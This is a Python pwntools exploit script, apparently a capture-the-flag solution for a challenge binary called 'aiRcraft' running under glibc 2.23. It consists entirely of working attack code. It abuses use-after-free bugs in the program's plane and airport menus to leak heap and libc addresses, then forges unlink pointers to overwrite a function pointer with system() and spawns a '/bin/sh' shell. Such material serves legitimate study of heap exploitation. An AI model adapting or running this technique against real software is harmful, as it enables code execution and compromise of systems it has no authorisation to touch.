from pwn import *
p = process('./aiRcraft', env = {"LD_PRELOAD":"./libc6_2.23-0ubuntu10_amd64.so"})
#gdb.attach(p)
#print "building_airport"
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("20")
p.recvuntil("Please input the name: ")
p.sendline("air1")
#print "first plane"
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Input the plane's name: ")
p.sendline("first")
#print "second plane"
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Input the plane's name: ")
p.sendline("second")
#print "free_first_plane"
p.recvuntil("Your choice: ")
p.sendline("4")
p.recvuntil("Which plane do you want to choose? ")
p.sendline("first")
p.recvuntil("Your choice: ")
p.sendline("2")
#print "fly_second_to_air1"
p.recvuntil("Your choice: ")
p.sendline("4")
p.recvuntil("Which plane do you want to choose? ")
p.sendline("second")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("which airport do you want to fly? ")
p.sendline("0")
p.recvuntil("Your choice: ")
p.sendline("3")
#print "free_second_plane"
p.recvuntil("Your choice: ")
p.sendline("4")
p.recvuntil("Which plane do you want to choose? ")
p.sendline("second")
p.recvuntil("Your choice: ")
p.sendline("2")
#print "list_all_the_planes"
p.recvuntil("Your choice: ")
p.sendline("3")
p.recvuntil("Which airport do you want to choose? ")
p.sendline("0")
p.recvuntil("Your choice: ")
p.sendline("1")
print "heap_leak"
p.recvuntil("Plane name: ")
heap_base = u64(p.recvline().strip() + "\x00\x00") - 0xb0
print hex(heap_base)
p.recvuntil("Your choice: ")
p.sendline("3")

#building_airport for libc leak
#print "building_airport"
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("20")
p.recvuntil("Please input the name: ")
p.sendline("air2")
#print "building_airport"
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("20")
p.recvuntil("Please input the name: ")
p.sendline("air3")
#freeing both so that they get freed in the unsorted bin
p.recvuntil("Your choice: ")
p.sendline("3")
p.recvuntil("Which airport do you want to choose? ")
p.sendline("2")
p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("Your choice: ")
p.sendline("3")
p.recvuntil("Which airport do you want to choose? ")
p.sendline("1")
p.recvuntil("Your choice: ")
p.sendline("2")

p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("72")
p.sendline("\x00"*32 + p64(heap_base+0x160)*3 + "\x00"*15)
#list the planes
p.recvuntil("Your choice: ")
p.sendline("3")
p.recvuntil("Which airport do you want to choose? ")
p.sendline("0")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Build by ")
libc_base = u64(p.recvline().strip()+"\x00\x00")-0x3c3b78
print hex(libc_base)
system = libc_base + 0x45390
p.recvuntil("3. Exit\nYour choice: ")
p.sendline("3")

#sell the airport
p.recvuntil("Your choice: ")
p.sendline("3")
p.recvuntil("Which airport do you want to choose? ")
p.sendline("3")
p.recvuntil("Your choice: ")
p.sendline("2")

#to corrupt the fastbin
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Input the plane's name: ")
p.sendline("third")

p.recvuntil("Your choice: ")
p.sendline("4")
p.recvuntil("Which plane do you want to choose? ")
p.sendline("third")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("which airport do you want to fly? ")
p.sendline("0")
p.recvuntil("Your choice: ")
p.sendline("3")

p.recvuntil("Your choice: ")
p.sendline("4")
p.recvuntil("Which plane do you want to choose? ")
p.sendline("third")
p.recvuntil("Your choice: ")
p.sendline("2")


#setting fd and bk for the unlink
fd = libc_base + 0x3c3b40  #(main_area)
bk = heap_base + 0x218   #(third plane address)

p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("72")
p.sendline("\x00"*48 + p64(fd - 56) + p64(bk) + "a"*7)

p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Your choice: ")
p.sendline("1")
p.recvuntil("Input the plane's name: ")
p.sendline("/bin/sh\x00"+p64(0)+p64(0x51))

p.recvuntil("Your choice: ")
p.sendline("3")
p.recvuntil("Which airport do you want to choose? ")
p.sendline("0")
p.recvuntil("Your choice: ")
p.sendline("2")

p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("72")
p.sendline("snadkjasdnkjasdn")

p.recvuntil("Your choice: ")
p.sendline("2")
p.recvuntil("How long is the airport's name? ")
p.sendline("72")
p.sendline("\x00"*24 + p64(heap_base+0x300) + p64(0) + p64(system))

gdb.attach(p)
p.recvuntil("Your choice: ")
p.sendline("4")
p.recvuntil("Which plane do you want to choose? ")
p.sendline("/bin/sh")
p.recvuntil("Your choice: ")
p.sendline("2")

p.interactive()
